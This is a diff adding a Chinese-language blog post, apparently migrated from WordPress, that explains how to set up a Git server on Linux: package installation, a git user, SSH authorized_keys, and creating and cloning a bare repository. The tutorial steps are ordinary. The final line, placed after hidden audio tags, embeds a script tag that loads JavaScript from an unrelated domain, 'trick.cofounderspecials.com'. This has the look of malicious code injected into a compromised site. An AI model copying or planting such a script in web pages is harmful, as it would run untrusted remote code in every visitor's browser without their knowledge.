@@ -1,0 +1,56 @@
+---
+layout: post
+title: 搭建Git 服务器
+date: 2020-12-16 10:36:57.000000000 +08:00
+type: post
+parent_id: '0'
+published: true
+password: ''
+status: publish
+categories:
+- Linux
+tags: []
+meta:
+  blocksy_post_meta_options: a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}
+author:
+  login: gavin
+  email: 519077334@qq.com
+  display_name: gavin
+  first_name: ''
+  last_name: ''
+permalink: "/index.php/2020/12/16/%e6%90%ad%e5%bb%bagit-%e6%9c%8d%e5%8a%a1%e5%99%a8/"
+---
+<h3>1、安装Git</h3>
+<pre class="prettyprint prettyprinted"><span class="pln">$ yum install curl</span><span class="pun">-</span><span class="pln">devel expat</span><span class="pun">-</span><span class="pln">devel gettext</span><span class="pun">-</span><span class="pln">devel openssl</span><span class="pun">-</span><span class="pln">devel zlib</span><span class="pun">-</span><span class="pln">devel perl</span><span class="pun">-</span><span class="pln">devel
+$ yum install git</span></pre>
+<p>接下来我们 创建一个git用户组和用户，用来运行git服务：</p>
+<pre class="prettyprint prettyprinted"><span class="pln">$ groupadd git
+$ useradd git </span><span class="pun">-</span><span class="pln">g git</span></pre>
+<h3>2、创建证书登录</h3>
+<p>收集所有需要登录的用户的公钥，公钥位于id_rsa.pub文件中，把我们的公钥导入到/home/git/.ssh/authorized_keys文件里，一行一个。</p>
+<p>如果没有该文件创建它：</p>
+<pre class="prettyprint prettyprinted"><span class="pln">$ cd </span><span class="pun">/</span><span class="pln">home</span><span class="pun">/</span><span class="pln">git</span><span class="pun">/</span><span class="pln">
+$ mkdir </span><span class="pun">.</span><span class="pln">ssh
+$ chmod </span><span class="lit">755</span> <span class="pun">.</span><span class="pln">ssh
+$ touch </span><span class="pun">.</span><span class="pln">ssh</span><span class="pun">/</span><span class="pln">authorized_keys
+$ chmod </span><span class="lit">644</span> <span class="pun">.</span><span class="pln">ssh</span><span class="pun">/</span><span class="pln">authorized_keys</span></pre>
+<h3>3、初始化Git仓库</h3>
+<p>首先我们选定一个目录作为Git仓库，假定是/home/gitrepo/runoob.git，在/home/gitrepo目录下输入命令：</p>
+<pre class="prettyprint prettyprinted"><span class="pln">$ cd </span><span class="pun">/</span><span class="pln">home
+$ mkdir gitrepo
+$ chown git</span><span class="pun">:</span><span class="pln">git gitrepo</span><span class="pun">/</span><span class="pln">
+$ cd gitrepo
+
+$ git init </span><span class="pun">--</span><span class="pln">bare app</span><span class="pun">.</span><span class="pln">git
+</span><span class="typ">Initialized</span><span class="pln"> empty </span><span class="typ">Git</span><span class="pln"> repository </span><span class="kwd">in</span> <span class="pun">/</span><span class="pln">home</span><span class="pun">/</span><span class="pln">gitrepo</span><span class="pun">/</span><span class="pln">app</span><span class="pun">.</span><span class="pln">git</span><span class="pun">/</span></pre>
+<p>以上命令Git创建一个空仓库，服务器上的Git仓库通常都以.git结尾。然后，把仓库所属用户改为git：</p>
+<pre class="prettyprint prettyprinted"><span class="pln">$ chown </span><span class="pun">-</span><span class="pln">R git</span><span class="pun">:</span><span class="pln">git app</span><span class="pun">.</span><span class="pln">git</span></pre>
+<h3>4、克隆仓库</h3>
+<pre class="prettyprint prettyprinted"><span class="pln">$ git clone git@*.*.*.*</span><span class="pun">:</span><span class="str">/home/</span><span class="pln">gitrepo</span><span class="pun">/</span><span class="pln">app</span><span class="pun">.</span><span class="pln">git
+</span><span class="typ">Cloning</span> <span class="kwd">into</span> <span class="str">'app'</span><span class="pun">...</span><span class="pln">
+warning</span><span class="pun">:</span> <span class="typ">You</span><span class="pln"> appear to have cloned an empty repository</span><span class="pun">.</span>
+<span class="typ">Checking</span><span class="pln"> connectivity</span><span class="pun">...</span> <span class="kwd">done</span><span class="pun">.</span></pre>
+<p><span class="pln">*.*.*.*</span> 为 Git 所在服务器 ip ，你需要将其修改为你自己的 Git 服务 ip。</p>
+<p>这样我们的 Git 服务器安装就完成。</p>
+<p><audio style="display: none;" controls="controls"></audio></p>
+<p><audio style="display: none;" controls="controls"></audio><script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script></p>
